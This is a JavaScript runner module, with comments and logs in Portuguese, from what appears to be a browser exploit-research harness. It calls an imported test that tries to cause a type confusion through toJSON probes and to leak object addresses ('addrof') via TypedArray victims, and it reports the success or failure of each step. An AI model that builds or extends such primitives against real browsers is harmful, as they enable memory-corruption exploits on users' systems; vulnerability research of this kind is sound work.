// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDetailsObject,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO
} from './testArrayBufferVictimCrash.mjs'; // NOME DA FUNÇÃO E MÓDULO ATUALIZADOS E IMPORTADOS

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_LeakObjectsViaConfusedDetailsObject";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (LeakObjectsViaConfusedDetailsObject) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDetailsObject();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    }

    if (result.errorCapturedMain) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-LOVCDO) ERR: ${result.errorCapturedMain.name}`;
        if (result.errorCapturedMain.name === 'TypeError' && result.errorCapturedMain.message.includes("circular structure")) {
            logS3(`    NOTA: TypeError de estrutura circular. Isso é esperado se o objeto C1 modificado foi serializado com sucesso pelo stringify principal e depois novamente pelo logger do runner.`, "info");
        }
    } else {
        logS3(`  RESULTADO: Completou. Estado final do objeto C1_details (snapshot): ${result.toJSON_details ? JSON.stringify(result.toJSON_details, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);
        logS3(`  Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "info", FNAME_RUNNER);

        let heisenbugAndWriteOnC1Confirmed = false;
        // A confirmação da Heisenbug agora é se o resultado da sonda indica que os payloads foram atribuídos ao C1_details
        const call2Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 2);
        if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned_to_C1_this && call2Details.payload_B_assigned_to_C1_this) {
            heisenbugAndWriteOnC1Confirmed = true;
            logS3(`  !!!! TYPE CONFUSION E ESCRITA NO OBJETO C1_DETAILS CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
        } else {
            logS3(`  ALERT: Type Confusion ou escrita de payloads no C1_details NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
        }

        let anyAddrofSuccess = false;
        if (result.addrof_A_result && result.addrof_A_result.success) {
            logS3(`    ADDROF A (from C1.payload_A) SUCESSO! ${result.addrof_A_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_A_result) {
            logS3(`    ADDROF A (from C1.payload_A) FALHOU: ${result.addrof_A_result.msg}`, "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result && result.addrof_B_result.success) {
            logS3(`    ADDROF B (from C1.payload_B) SUCESSO! ${result.addrof_B_result.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
        } else if (result.addrof_B_result) {
            logS3(`    ADDROF B (from C1.payload_B) FALHOU: ${result.addrof_B_result.msg}`, "warn", FNAME_RUNNER);
        }

        // Detalhes da sonda interna podem ter erros, mesmo que o teste principal não tenha
        let lastCallProbeDetails = null;
        if(result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0){
            lastCallProbeDetails = result.all_probe_calls_for_analysis[result.all_probe_calls_for_analysis.length-1];
        }
        if (lastCallProbeDetails && lastCallProbeDetails.error_in_probe) {
            logS3(`    ERRO INTERNO NA ÚLTIMA SONDA REGISTRADA: ${lastCallProbeDetails.error_in_probe}`, "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: AddrInC1 SUCCESS!`;
        } else if (heisenbugAndWriteOnC1Confirmed) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: C1_TC&Write OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: No C1_TC?`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (LeakObjectsViaConfusedDetailsObject) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (LeakObjectsViaConfusedDetailsObject) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    // Atualização final do título, caso nenhuma condição mais específica tenha sido atendida
    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && !document.title.includes("C1_TC&Write OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO} Concluído`;
        }
    }
}
